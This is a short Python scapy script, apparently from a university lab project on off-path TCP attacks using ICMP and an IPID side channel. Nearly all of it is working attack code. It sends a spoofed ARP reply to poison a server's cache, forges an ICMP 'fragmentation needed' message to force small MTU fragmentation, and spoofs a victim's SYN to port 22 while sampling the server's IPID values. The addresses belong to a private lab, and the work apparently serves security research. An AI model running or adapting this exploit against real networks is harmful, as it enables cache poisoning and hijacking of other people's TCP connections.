# coding=utf-8

import struct
from scapy.all import *
from scapy.layers.inet import *

"""
    @CreateDate:    2020/1/21
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      single_check.py
    @Brief:         This program is a toy version of parallel_check.py.
                    Using forge_ip as a parameter, get two ICMP IPID
                    in slide (page 10, 11).
    @Modify:        
"""

# forge_ip = '100.100.4.221'
forge_ip = '100.100.6.102'

victim_ip = '100.100.128.2'
server_ip = '100.100.128.3'
server_mac_addr = '00:0c:29:ac:09:a4'
my_mac_addr = '00:0c:29:87:ae:8f'

# construct a zero payload
z_payload = b''
for i in range(0, 520):
    z_payload += struct.pack('B', 0)

# ARP-Poison Attack
send(IP(src=forge_ip, dst=server_ip) /
     UDP(dport=1772),
     iface='ens33')
pkt = sniff(iface='ens33', filter="arp", count=1)
send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forge_ip, hwsrc=my_mac_addr, op=2),
     iface='ens33')

# force TCP set DF as 0
send(IP(src=forge_ip, dst=server_ip) /
     ICMP(type=3, code=4, nexthopmtu=68) /
     IP(flags=2, src=server_ip, dst=victim_ip) /
     ICMP(type=0, code=0) /
     z_payload,
     iface='ens33')

ans, uans = sr([
                IP(src=forge_ip, dst=server_ip) / ICMP(),
                IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
                IP(src=forge_ip, dst=server_ip) / ICMP()
                ], iface='ens33')

# ans.res[1][0].show()
ipid1 = ans.res[0][1].fields['id']
ipid2 = ans.res[-1][1].fields['id']

print('ICMP IPID:')
print(ipid1)
print(ipid2)